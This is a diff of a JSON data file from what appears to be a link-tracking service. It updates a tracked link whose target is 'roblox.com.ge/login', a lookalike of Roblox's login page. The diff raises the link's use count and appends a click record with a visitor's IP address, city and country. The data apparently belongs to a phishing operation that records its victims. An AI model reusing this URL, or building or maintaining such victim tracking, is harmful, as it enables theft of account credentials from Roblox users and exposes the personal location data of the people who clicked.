@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1718,
+    "useCount": 1719,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13912,6 +13912,14 @@
         "city": "Hanover",
         "flag": "🇩🇪",
         "countryCode": "DE"
+      },
+      {
+        "timestamp": 1783105090380,
+        "ip": "64.217.135.56",
+        "country": "United States",
+        "city": "Avon",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
